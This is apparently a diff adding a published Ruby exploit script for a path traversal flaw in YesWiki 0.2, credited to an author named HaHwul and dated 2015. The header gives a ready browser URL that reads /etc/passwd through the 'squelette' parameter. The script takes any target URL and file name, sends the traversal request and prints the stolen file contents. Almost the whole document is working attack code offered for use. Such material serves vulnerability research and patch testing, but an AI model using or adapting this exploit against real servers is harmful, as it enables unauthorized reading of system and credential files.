@@ -1,0 +1,44 @@
+# Exploit Title: YESWIKI 0.2 - Path Traversal
+# Date: 2015-09-02
+# Exploit Author: HaHwul
+# Exploit Author Blog: http://www.codeblack.net
+# Vendor Homepage: http://yeswiki.net
+# Software Link: https://github.com/YesWiki/yeswiki
+# Version: yeswiki 0.2
+# Tested on: Debian [Wheezy]
+# CVE : none
+# ===========================================
+
+#Vulnerability 
+#Open Browser: http://[targetURL]//vul_test/yeswiki/wakka.php?wiki=PagesACreer/edit&theme=yeswiki&squelette=/../../../../../../../../../../../../etc/passwd&style=gray.css&bgimg=&newpage=1
+
+require "net/http"
+require "uri"
+
+if ARGV.length != 2
+
+puts "YESWIKI Path Traversal Exploit - File Downloader"
+puts "Usage: ruby yeswiki_traversal.rb [targetURL wakka.php] [File name]"
+puts "  Example : ~~.rb http://127.0.0.1/vul_test/yeswiki/wakka.php /etc/passwd"
+puts "  exploit & code by hahwul[www.codeblack.net]"
+
+else
+puts "YESWIKI Path Traversal Exploit - File Downloader"
+puts "#set Payload..."
+target=ARGV[0]
+downfile=ARGV[1]
+puts " + target : #{target}"
+puts " + DownFile : #{downfile}"
+puts "#Exploit"
+uri = URI.parse("#{target}/vul_test/yeswiki/wakka.php")
+uri.query = URI.encode_www_form({"wiki"=>"PagesACreer/edit","newpage"=>"1","style"=>"gray.css","bgimg"=>"","squelette"=>"/../../../../../../../../../../../../#{downfile}","theme"=>"yeswiki"})
+http = Net::HTTP.new(uri.host, uri.port)
+request = Net::HTTP::Get.new(uri.request_uri)
+response = http.request(request)
+puts "#Response code: "+response.code
+endNm = response.body.index("<")
+result = response.body[0..endNm-1]
+puts "#Result: "+result
+puts "#End.."
+end
+
